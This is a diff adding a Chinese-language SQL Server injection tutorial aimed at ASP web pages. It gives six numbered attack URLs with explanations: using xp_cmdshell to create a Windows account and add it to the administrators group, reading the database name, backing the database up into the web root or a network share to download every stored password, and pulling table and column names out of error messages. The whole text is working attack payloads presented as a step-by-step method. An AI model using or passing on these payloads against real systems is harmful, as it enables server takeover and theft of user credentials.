@@ -1,0 +1,25 @@
+① http://Site/url.ASP?id=1;exec master..xp_cmdshell “net user name password /add”-- 
+
+　　分号;在SQLServer中表示隔开前后两句语句，--表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着：　　 
+
+　　② http://Site/url.ASP?id=1;exec master..xp_cmdshell “net localgroup name administrators /add”-- 
+
+　　将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。 
+
+　　③ http://Site/url.ASP?id=1 ;;and db_name()＞0　　 
+
+　　前面有个类似的例子and user＞0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。　　 
+
+　　④ http://Site/url.ASP?id=1;backup database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;--　　 
+
+　　这是相当狠的一招，从③拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！在不知道绝对路径的时候，还可以备份到网络地址的方法（如\\202.96.xx.xx\Share\1.db），但成功率不高。 
+
+　　⑤ http://Site/url.ASP?id=1 ;;and (Select Top 1 name from sysobjects where xtype=’U’ and status＞0)＞0　　 
+
+　　前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype=’U’ and status＞0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。　　 
+
+　　⑥ http://Site/url.ASP?id=1 ;;and (Select Top 1 col_name(object_id(‘表名’),1) from sysobjects)＞0　 
+
+　　从⑤拿到表名后，用object_id(‘表名’)获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4...就可以逐个获取所猜解表里面的字段名。 
+
+　　以上6点是我研究SQLServer注入半年多以来的心血结晶，可以看出，对SQLServer的了解程度，直接影响着成功率及猜解速度。在我研究SQLServer注入之后，我在开发方面的水平也得到很大的提高，呵呵，也许安全与开发本来就是相辅相成的吧。 
